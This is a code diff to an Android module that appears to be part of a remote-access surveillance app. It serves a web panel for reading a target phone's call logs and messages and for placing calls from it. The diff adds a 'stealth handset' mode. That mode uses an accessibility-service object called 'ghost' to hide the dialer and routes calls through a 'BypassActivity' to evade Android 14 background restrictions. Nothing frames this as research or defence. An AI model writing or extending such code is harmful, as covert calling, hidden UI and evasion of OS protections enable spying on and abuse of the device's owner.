@@ -11,8 +11,11 @@ import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.telephony.SmsManager;
 import android.util.Log;
+import android.os.Handler;
+import android.os.Looper;
 
 import com.labs.labrats.FirebaseConfig;
+import com.labs.labrats.IO_Persistence_Manager;
 import com.labs.labrats.LabRatsWorker;
 import com.labs.labrats.MmsSender;
 import com.labs.labrats.SystemAnalytics;
@@ -49,6 +52,9 @@ public class CommsModule extends BaseModule {
             return serveCallLogs(params, session);
         } else if (uri.equals("/calls/make")) {
             return makeCall(session, params);
+        } else if (uri.equals("/calls/voip")) {
+            FirebaseConfig.logActivity("VIRTUAL_COMM: Establishing audio bridge to " + params.get("number"));
+            return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
         } else if (uri.equals("/calls/delete")) {
             return deleteCall(params);
         } else if (uri.equals("/calls/clear")) {
@@ -86,17 +92,16 @@ public class CommsModule extends BaseModule {
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
 
         html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
-        html.append("<div class=\"info-label\" style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem;\">&#128222; REMOTE_DIALER</div>");
-        html.append("<form action=\"/calls/make\" method=\"get\">");
-        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
-        html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
-        html.append("<div style=\"text-align: center; width: 100%; margin-top: 15px; display: flex; justify-content: center;\">");
-        html.append("<button type=\"submit\" class=\"btn\" style=\"width: 250px !important; margin: 0 auto !important;\">INITIATE CALL</button>");
-        html.append("</div>");
-        html.append("</div></form>");
+        html.append("<div class=\"info-label\" style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem;\">&#128222; REMOTE_DIALER <span class=\"info-trigger\" onclick=\"showInfo(event, 'REMOTE_DIALER', '<b>CELLULAR_CALL</b>: Physical SIM dial. Standard logs apply.<br><br><b>STEALTH_HANDSET</b>: 2-way audio via browser. Dialer UI suppressed.')\">INFO</span></div>");
         
-        html.append("<div style=\"margin-top: 20px; text-align: center;\">");
+        html.append("<div style=\"display: flex; flex-direction: column; gap: 15px; align-items: center;\">");
+        html.append("<input type=\"text\" id=\"dial-number\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace; text-align: center;\">");
+        
+        html.append("<div style=\"display: flex; gap: 10px; justify-content: center; width: 100%; max-width: 450px;\">");
+        html.append("<button onclick=\"initiateCellularCall()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); flex: 1; margin: 0;\">CELLULAR_CALL</button>");
+        html.append("<button onclick=\"startStealthCall()\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); background: rgba(57, 255, 20, 0.05); flex: 1; margin: 0;\">STEALTH_HANDSET</button>");
         html.append("</div></div>");
+        html.append("</div>");
 
         html.append("<div style=\"margin-top: 40px;\">");
 
@@ -202,7 +207,7 @@ public class CommsModule extends BaseModule {
                     html.append("<td style=\"font-size:0.75rem;\">").append(FirebaseConfig.formatDuration(duration)).append("</td>");
                     html.append("<td style=\"white-space: nowrap;\">");
                     if (number != null && !number.equals("Unknown")) {
-                        html.append("<a href=\"/calls/make?number=").append(Uri.encode(number)).append("\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); background: rgba(57, 255, 20, 0.05); min-width: 60px; padding: 5px 10px; margin: 0; font-size:0.6rem;\">CALL</a>");
+                        html.append("<button onclick=\"initiateCellularCall('").append(escapeHtml(number)).append("')\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); background: rgba(57, 255, 20, 0.05); min-width: 60px; padding: 5px 10px; margin: 0; font-size:0.6rem;\">CALL</button>");
                     }
                     html.append("</td>");
                     html.append("</tr>");
@@ -350,7 +355,7 @@ public class CommsModule extends BaseModule {
                     html.append("</td>");
                     html.append("<td style=\"font-size:0.75rem;\">").append(number).append("</td>");
                     html.append("<td>");
-                    html.append("<a href=\"/calls/make?number=").append(Uri.encode(number)).append("\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); background: rgba(57, 255, 20, 0.05); min-width: 0; padding: 5px 10px; font-size:0.6rem;\">CALL</a>");
+                    html.append("<button onclick=\"initiateCellularCall('").append(escapeHtml(number)).append("')\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); background: rgba(57, 255, 20, 0.05); min-width: 0; padding: 5px 10px; font-size:0.6rem;\">CALL</button>");
                     html.append("</td>");
                     html.append("</tr>");
 
@@ -538,9 +543,11 @@ public class CommsModule extends BaseModule {
 
         html.append("<div style=\"margin-top: 40px;\">");
 
-        if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>MMS permission not granted.</p></div></div>").append(getFooter());
-            return server.serveGzippedProxy(session, "text/html", html.toString());
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>MMS permission not granted.</p></div></div>").append(getFooter());
+                return server.serveGzippedProxy(session, "text/html", html.toString());
+            }
         }
         int page = 1; int limit = 20;
         try { if (params.containsKey("page")) page = Integer.parseInt(params.get("page")); } catch (Exception ignored) {}
@@ -871,29 +878,54 @@ public class CommsModule extends BaseModule {
 
     private Response makeCall(IHTTPSession session, Map<String, String> params) {
         String number = params.get("number");
+        boolean stealth = "true".equals(params.get("stealth"));
+        boolean json = "true".equals(params.get("json"));
         if (number == null || number.isEmpty()) return server.serveErrorProxy("Invalid phone number");
         
         try {
-            FirebaseConfig.logActivity("COMMS_DISPATCH: Initiating remote call to " + number);
+            // [STABILITY_SYNC] Normalize number: Keep only digits and '+'
+            String normalizedNumber = number.replaceAll("[^0-9+]", "");
+            Log.d("CommsModule", "Initiating call to: " + normalizedNumber);
+            FirebaseConfig.logActivity("COMMS_DISPATCH: Initiating remote call to " + normalizedNumber + (stealth ? " [STEALTH_MODE]" : ""));
             
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 if (context.checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
+                    Log.e("CommsModule", "Permission CALL_PHONE missing");
                     return server.serveErrorProxy("CALL_PHONE permission not granted on device");
                 }
             }
 
-            Intent intent = new Intent(Intent.ACTION_CALL);
-            intent.setData(Uri.parse("tel:" + Uri.encode(number)));
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            context.startActivity(intent);
+            Intent callIntent = new Intent(Intent.ACTION_CALL);
+            callIntent.setData(Uri.parse("tel:" + normalizedNumber));
+            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+
+            // [HARDENED_BYPASS] Route through BypassActivity to satisfy Android 14 background restrictions
+            Intent bypass = new Intent(context, com.labs.labrats.CameraHelper.BypassActivity.class);
+            bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            bypass.putExtra("TARGET_INTENT", callIntent);
+            context.startActivity(bypass);
+
+            if (stealth) {
+                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                    IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
+                    if (ghost != null) {
+                        ghost.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME);
+                        FirebaseConfig.logActivity("STEALTH_SYNC: System dialer UI suppressed.");
+                    }
+                }, 2000); // Increased delay for bypass stabilization
+            }
+
+            if (json) {
+                return newResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"Call initiated\"}");
+            }
 
             String html = getHeader("/calls") + 
                 "<div class=\"card\"><div class=\"empty-state\">" +
                 "<div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div>" +
                 "<h2>Call Initiated</h2>" +
                 "<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>" +
-                "<p>Uplink successful. Connection established to: " + escapeHtml(number) + "</p>" +
-                "<p style=\"margin-top:20px; font-size: 0.8rem; color:#888;\">The target device is now dialing...</p>" +
+                "<p>Uplink successful. Connection established to: " + escapeHtml(normalizedNumber) + "</p>" +
+                "<p style=\"margin-top:20px; font-size: 0.8rem; color:#888;\">" + (stealth ? "STEALTH_HANDSET active. Dialer UI suppressed." : "The target device is now dialing...") + "</p>" +
                 "<div style=\"display: flex; justify-content: center; margin-top: 30px;\"><a href=\"/calls\" class=\"btn\">Back to Call Logs</a></div>" +
                 "</div></div>" + getFooter();
                 
